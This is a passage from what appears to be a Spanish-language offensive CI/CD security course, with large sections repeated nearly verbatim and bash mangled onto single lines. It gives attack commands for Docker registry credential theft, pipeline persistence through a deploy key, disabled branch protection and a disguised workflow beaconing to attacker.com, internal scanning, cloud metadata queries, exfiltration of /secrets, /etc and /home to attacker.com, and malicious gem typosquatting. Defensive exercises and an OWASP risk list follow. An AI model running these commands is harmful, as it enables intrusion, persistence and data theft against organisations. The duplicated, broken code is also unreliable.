curl -s https://registry.victim.com/v2/_catalog
# {"repositories":["app","api","worker","internal-tools"]}

# Listar tags de una imagen
curl -s https://registry.victim.com/v2/app/tags/list
# {"name":"app","tags":["latest","v1.0.0","v1.0.1","v2.0.0"]}

# Descargar manifest
curl -s https://registry.victim.com/v2/app/manifests/latest

# Descargar layers
curl -s -L https://registry.victim.com/v2/app/blobs/sha256:xxx

# Si el registro requiere auth, buscar credenciales en:
# - ~/.docker/config.json
# - CI/CD secrets
# - Environment variables (DOCKER_AUTH_CONFIG)

cat ~/.docker/config.json
# {"auths":{"registry.victim.com":{"auth":"base64encoded_username:password"}}}
```

### 10.3 Escenario 3: [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) Takeover (continuacion)

**Fase 3: [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) avanzada**

Despues de comprometer el pipeline, establecer persistencia:

```bash
# 1. Crear deploy key con acceso de escritura
ssh-keygen -t rsa -b 4096 -f /tmp/evil_key -N ""
gh repo deploy-key add /tmp/evil_key.pub \ --repo victim-org/victim-repo \ --title "CD Key" \ --allow-write

# 2. Crear token personal con acceso a repos
gh auth token --scopes "repo,workflow,write:packages"

# 3. Modificar branch protection (si tenemos admin)
gh api repos/victim-org/victim-repo/branches/main/protection \ --method PUT \ --input - <<< '{"required_status_checks":null,"enforce_admins":null,"required_pull_request_reviews":null,"restrictions":null}'

# 4. Crear workflow que ejecute codigo periodicamente
cat > .github/workflows/persistence.yml << 'EOF'
name: Health Check
on: schedule: - cron: '*/30 * * * *'
jobs: check: runs-on: ubuntu-latest steps: - run: | curl -s http://attacker.com/beacon?id=$(hostname) & # Ejecutar tareas de mantenimiento periodicamente
EOF

git add .github/workflows/persistence.yml
git commit -m "Add health check workflow"
git push
```

**Fase 4: Movimiento lateral desde el pipeline**

```bash
# Desde el runner comprometido, pivotear a otros servicios:

# 1. Escanear red interna
nmap -sn 10.0.0.0/24 -oG /dev/stdout | grep Up

# 2. Buscar metadata service cloud
curl -s http://169.254.169.254/latest/meta-data/
curl -s -H "Metadata: true" http://169.254.169.254/metadata/instance

# 3. Acceder a otros servicios internos
# Kubernetes API
curl -s http://10.0.0.1:6443/api/v1/namespaces/default/secrets

# Jenkins
curl -s http://jenkins.internal:8080/

# Artifactory
curl -s http://artifactory.internal:8081/artifactory/api/storage/

# 4. Usar credenciales de AWS/Azure/GCP del pipeline
aws ec2 describe-instances --region us-east-1
az vm list --output table
gcloud compute instances list

# 5. Exfiltrar datos
tar czf /tmp/data.tar.gz /secrets/ /etc/ /home/
curl -X POST http://attacker.com/exfil -F "file=@/tmp/data.tar.gz"
```

### 12.1 Ejercicios Adicionales

**Ejercicio 1: Deteccion de Dependency Confusion**
```bash
#!/bin/bash
# check_dependency_confusion.sh
# Verificar paquetes internos que podrian ser victimas de dependency confusion

check_package { local registry=$1 local package=$2 echo -n "Checking $package on $registry.. " response=$(curl -s -o /dev/null -w "%{http_code}" "$registry/$package") if [ "$response" = "200" ]; then echo "VULNERABLE! Package exists on public registry" elif [ "$response" = "404" ]; then echo "Safe - not found on public registry" else echo "Unknown (HTTP $response)" fi
}

# npm
echo "=== NPM ==="
for pkg in "@acme/auth" "@acme/utils" "acme-internal"; do check_package "https://registry.npmjs.org" "$pkg"
done

# PyPI
echo "=== PyPI ==="
for pkg in "acme-auth" "acme-utils" "acme-internal"; do check_package "https://pypi.org/pypi" "$pkg/json"
done

# Maven
echo "=== Maven Central ==="
for artifact in "com.acme.internal:auth-lib" "com.acme:utils"; do check_package "https://search.maven.org/artifact" "$artifact"
done
```

**Ejercicio 2: Analisis de SBOM**
```bash
# Generar SBOM de un proyecto
npx cyclonedx-npm --output-file sbom.json

# Analizar SBOM en busca de dependencias sospechosas
cat sbom.json | jq '.components | select(.name | contains("alpha") or contains("beta") or contains("test")'

# Verificar firmas de paquetes en el SBOM
cat sbom.json | jq '.components | .purl' | while read purl; do echo "Verificando: $purl" # Verificar integridad del paquete
done

# Identificar dependencias sin mantenimiento
cat sbom.json | jq '.components | select(.version | contains("0.0") or contains("0.1")'
```

**Ejercicio 3: Hardening de Pipeline**
```bash
#!/bin/bash
# audit_pipeline_hardening.sh
# Verificar hardening del pipeline CI/CD

echo "=== Auditando Pipeline ==="
PASS=0
FAIL=0

# GitHub Actions
if [ -f ".github/workflows/*.yml" ]; then for wf in .github/workflows/*.yml; do # Verificar que las actions estan pinneadas a SHA if grep -q "uses:.*@[a-f0-9]\{40\}" "$wf"; then echo "[PASS] $wf: Actions pinneadas a SHA" (PASS++) else echo "[FAIL] $wf: Actions NO pinneadas a SHA" (FAIL++) fi # Verificar que no usa pull_request_target sin cuidado if grep -q "pull_request_target:" "$wf"; then echo "[WARN] $wf: Usa pull_request_target" (FAIL++) fi # Verificar minimo privilegio if grep -q "contents: write" "$wf"; then echo "[WARN] $wf: Tiene permisos de escritura" fi done
fi

# Dockerfile
if [ -f "Dockerfile" ]; then # Verificar que usa imagenes con SHA if grep -q "FROM.*@sha256:" Dockerfile; then echo "[PASS] Dockerfile: Imagenes pinneadas a SHA" (PASS++) else echo "[FAIL] Dockerfile: Imagenes NO pinneadas a SHA" (FAIL++) fi
fi

# Dependencias
if [ -f "package.json" ]; then if [ -f "package-lock.json" ]; then echo "[PASS] package-lock.json presente" (PASS++) else echo "[FAIL] package-lock.json AUSENTE" (FAIL++) fi
fi

echo
echo "=== Resumen: $PASS pasaron, $FAIL fallaron ==="
```

### 12.2 Referencia Rapida de CI/CD Security

**10 Riesgos Principales de Seguridad CI/CD (OWASP):**

1. **Flujo de control de pipeline inadecuado:** El pipeline permite modificar stages o inyectar pasos.
2. **Configuracion inadecuada de identidad y acceso:** [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) excesivos en el pipeline.
3. **Practicas de gestion de secrets pobres:** Secrets hardcodeados o mal rotados.
4. **Inyeccion de dependencias maliciosas:** Dependency confusion, typo-squatting.
5. **Validacion insuficiente de entrada:** Inyeccion de variables en pipelines.
6. **Credenciales de CI/CD expuestas:** Tokens en logs, outputs, artefactos.
7. **Propagacion de errores:** Informacion sensible en mensajes de error.
8. **Segregacion inadecuada de entornos:** Mezcla de ambientes dev/prod.
9. **Configuracion incorrecta de runners:** Self-hosted runners con demasiados permisos.
10. **Falta de monitoreo y auditoria:** No hay registro de actividades del pipeline.

**Categorias de ataques:**
| Categoria | Ejemplo | Impacto |
|-----------|---------|---------|
| PPE Directo | Modificar .github/workflows | Ejecutar codigo en el pipeline |
| PPE Indirecto | Comprometer action de terceros | Infectar todos los que la usan |
| Dependency Confusion | Subir paquete con nombre interno | Ejecutar codigo en build |
| Typosquatting | recte en vez de react | Robar datos del desarrollador |
| Secrets Leak | AWS key en commit | Acceso a infraestructura |
| Git History | Secrets en commits viejos | Recuperar credenciales rotadas |
| Runner Compromise | Self-hosted runner malicioso | Pivot a [red](../raw/r3d3s-f0nd4m3nt0s.md) interna |
| OIDC Abuse | Token de AWS obtenido via pipeline | Acceso a cloud | ### 5.5 Dependency Confusion en Maven

```xml
<!-- pom.xml con dependencia vulnerable -->
<dependency> <groupId>com.acme.internal</groupId> <artifactId>auth-lib</artifactId> <version>1.0.0</version>
</dependency>
```

Los atacantes pueden subir paquetes con el mismo `groupId:artifactId` a repositorios publicos como Maven Central.

**Ataque:**
1. Identificar paquetes internos de la empresa (groupId `com.acme.internal`)
2. Subir paquete malicioso a Maven Central con el mismo nombre
3. El build descarga la version publica (si no configuraron repositorio privado primero)

```xml
<!-- settings.xml mal configurado: Maven busca en publico PRIMERO -->
<settings> <mirrors> <mirror> <id>central</id> <url>https://repo.maven.apache.org/maven2</url> <mirrorOf>*</mirrorOf>  <!-- TODO: mal, deberia ser external:* --> </mirror> </mirrors>
</settings>
```

### 5.6 Typo-squatting en RubyGems

```bash
# Paquetes populares para typosquatting en Ruby:
# rails -> railes, raisl, railes
# devise -> devsie, devvise, dev1se
# puma -> pumma, pumaa, pumaz
# rack -> rak, rakck, rakc

# Crear gem malicioso
gem build evil.gemspec
gem push evil-99.0.0.gem

# O crear un gem con nombre similar
# rails -> railes
gem push railes-99.0.0.gem
```

### 8.4 Docker Registry Exploitation (continuacion)

```bash
# Acceder a Docker Registry API (si no requiere auth)
curl -s https://registry.victim.com/v2/_catalog
# {"repositories":["app","api","worker","internal-tools"]}

# Listar tags de una imagen
curl -s https://registry.victim.com/v2/app/tags/list
# {"name":"app","tags":["latest","v1.0.0","v1.0.1","v2.0.0"]}

# Descargar manifest
curl -s https://registry.victim.com/v2/app/manifests/latest

# Descargar layers
curl -s -L https://registry.victim.com/v2/app/blobs/sha256:xxx

# Si el registro requiere auth, buscar credenciales en:
# - ~/.docker/config.json
# - CI/CD secrets
# - Environment variables (DOCKER_AUTH_CONFIG)

cat ~/.docker/config.json
# {"auths":{"registry.victim.com":{"auth":"base64encoded_username:password"}}}
```

### 10.3 Escenario 3: Pipeline Takeover (continuacion)

**Fase 3: Persistencia avanzada**

Despues de comprometer el pipeline, establecer persistencia:

```bash
# 1. Crear deploy key con acceso de escritura
ssh-keygen -t rsa -b 4096 -f /tmp/evil_key -N ""
gh repo deploy-key add /tmp/evil_key.pub \ --repo victim-org/victim-repo \ --title "CD Key" \ --allow-write

# 2. Crear token personal con acceso a repos
gh auth token --scopes "repo,workflow,write:packages"

# 3. Modificar branch protection (si tenemos admin)
gh api repos/victim-org/victim-repo/branches/main/protection \ --method PUT \ --input - <<< '{"required_status_checks":null,"enforce_admins":null,"required_pull_request_reviews":null,"restrictions":null}'

# 4. Crear workflow que ejecute codigo periodicamente
cat > .github/workflows/persistence.yml << 'EOF'
name: Health Check
on: schedule: - cron: '*/30 * * * *'
jobs: check: runs-on: ubuntu-latest steps: - run: | curl -s http://attacker.com/beacon?id=$(hostname) & # Ejecutar tareas de mantenimiento periodicamente
EOF

git add .github/workflows/persistence.yml
git commit -m "Add health check workflow"
git push
```

**Fase 4: Movimiento lateral desde el pipeline**

```bash
# Desde el runner comprometido, pivotear a otros servicios:

# 1. Escanear red interna
nmap -sn 10.0.0.0/24 -oG /dev/stdout | grep Up

# 2. Buscar metadata service cloud
curl -s http://169.254.169.254/latest/meta-data/
curl -s -H "Metadata: true" http://169.254.169.254/metadata/instance

# 3. Acceder a otros servicios internos
# Kubernetes API
curl -s http://10.0.0.1:6443/api/v1/namespaces/default/secrets

# Jenkins
curl -s http://jenkins.internal:8080/

# Artifactory
curl -s http://artifactory.internal:8081/artifactory/api/storage/

# 4. Usar credenciales de AWS/Azure/GCP del pipeline
aws ec2 describe-instances --region us-east-1
az vm list --output table
gcloud compute instances list

# 5. Exfiltrar datos
tar czf /tmp/data.tar.gz /secrets/ /etc/ /home/
curl -X POST http://attacker.com/exfil -F "file=@/tmp/data.tar.gz"
```

### 12.1 Ejercicios Adicionales

**Ejercicio 1: Deteccion de Dependency Confusion**
```bash
#!/bin/bash
# check_dependency_confusion.sh
# Verificar paquetes internos que podrian ser victimas de dependency confusion

check_package { local registry=$1 local package=$2 echo -n "Checking $package on $registry.. " response=$(curl -s -o /dev/null -w "%{http_code}" "$registry/$package") if [ "$response" = "200" ]; then echo "VULNERABLE! Package exists on public registry" elif [ "$response" = "404" ]; then echo "Safe - not found on public registry" else echo "Unknown (HTTP $response)" fi
}

# npm
echo "=== NPM ==="
for pkg in "@acme/auth" "@acme/utils" "acme-internal"; do check_package "https://registry.npmjs.org" "$pkg"
done

# PyPI
echo "=== PyPI ==="
for pkg in "acme-auth" "acme-utils" "acme-internal"; do check_package "https://pypi.org/pypi" "$pkg/json"
done

# Maven
echo "=== Maven Central ==="
for artifact in "com.acme.internal:auth-lib" "com.acme:utils"; do check_package "https://search.maven.org/artifact" "$artifact"
done
```

**Ejercicio 2: Analisis de SBOM**
```bash
# Generar SBOM de un proyecto
npx cyclonedx-npm --output-file sbom.json

# Analizar SBOM en busca de dependencias sospechosas
cat sbom.json | jq '.components | select(.name | contains("alpha") or contains("beta") or contains("test")'

# Verificar firmas de paquetes en el SBOM
cat sbom.json | jq '.components | .purl' | while read purl; do echo "Verificando: $purl" # Verificar integridad del paquete
done

# Identificar dependencias sin mantenimiento
cat sbom.json | jq '.components | select(.version | contains("0.0") or contains("0.1")'
```

**Ejercicio 3: Hardening de Pipeline**
```bash
#!/bin/bash
# audit_pipeline_hardening.sh
# Verificar hardening del pipeline CI/CD

echo "=== Auditando Pipeline ==="
PASS=0
FAIL=0

# GitHub Actions
if [ -f ".github/workflows/*.yml" ]; then for wf in .github/workflows/*.yml; do # Verificar que las actions estan pinneadas a SHA if grep -q "uses:.*@[a-f0-9]\{40\}" "$wf"; then echo "[PASS] $wf: Actions pinneadas a SHA" (PASS++) else echo "[FAIL] $wf: Actions NO pinneadas a SHA" (FAIL++) fi # Verificar que no usa pull_request_target sin cuidado if grep -q "pull_request_target:" "$wf"; then echo "[WARN] $wf: Usa pull_request_target" (FAIL++) fi # Verificar minimo privilegio if grep -q "contents: write" "$wf"; then echo "[WARN] $wf: Tiene permisos de escritura" fi done
fi

# Dockerfile
if [ -f "Dockerfile" ]; then # Verificar que usa imagenes con SHA if grep -q "FROM.*@sha256:" Dockerfile; then echo "[PASS] Dockerfile: Imagenes pinneadas a SHA" (PASS++) else echo "[FAIL] Dockerfile: Imagenes NO pinneadas a SHA" (FAIL++) fi
fi

# Dependencias
if [ -f "package.json" ]; then if [ -f "package-lock.json" ]; then echo "[PASS] package-lock.json presente" (PASS++) else echo "[FAIL] package-lock.json AUSENTE" (FAIL++) fi
fi

echo
echo "=== Resumen: $PASS pasaron, $FAIL fallaron ==="
```

### 12.2 Referencia Rapida de CI/CD Security

**10 Riesgos Principales de Seguridad CI/CD (OWASP):**

1. **Flujo de control de pipeline inadecuado:** El pipeline permite modificar stages o inyectar pasos.
2. **Configuracion inadecuada de identidad y acceso:** Permisos excesivos en el pipeline.
3. **Practicas de gestion de secrets pobres:** Secrets hardcodeados o mal rotados.
4. **Inyeccion de dependencias maliciosas:** Dependency confusion, typo-squatting.
5. **Validacion insuficiente de entrada:** Inyeccion de variables en pipelines.
6. **Credenciales de CI/CD expuestas:** Tokens en logs, outputs, artefactos.
7. **Propagacion de errores:** Informacion sensible en mensajes de error.
8. **Segregacion inadecuada de entornos:** Mezcla de ambientes dev/prod.
9. **Configuracion incorrecta de runners:** Self-hosted runners con demasiados permisos.
10. **Falta de monitoreo y auditoria:** No hay registro de actividades del pipeline.

**Categorias de ataques:**
| Categoria | Ejemplo | Impacto |
|-----------|---------|---------|
| PPE Directo | Modificar .github/workflows | Ejecutar codigo en el pipeline |
| PPE Indirecto | Comprometer action de terceros | Infectar todos los que la usan |
| Dependency Confusion | Subir paquete con nombre interno | Ejecutar codigo en build |
| Typosquatting | recte en vez de react | Robar datos del desarrollador |
| Secrets Leak | AWS key en commit | Acceso a infraestructura |
| Git History | Secrets en commits viejos | Recuperar credenciales rotadas |
| Runner Compromise | Self-hosted runner malicioso | Pivot a red interna |
| OIDC Abuse | Token de AWS obtenido via pipeline | Acceso a cloud |

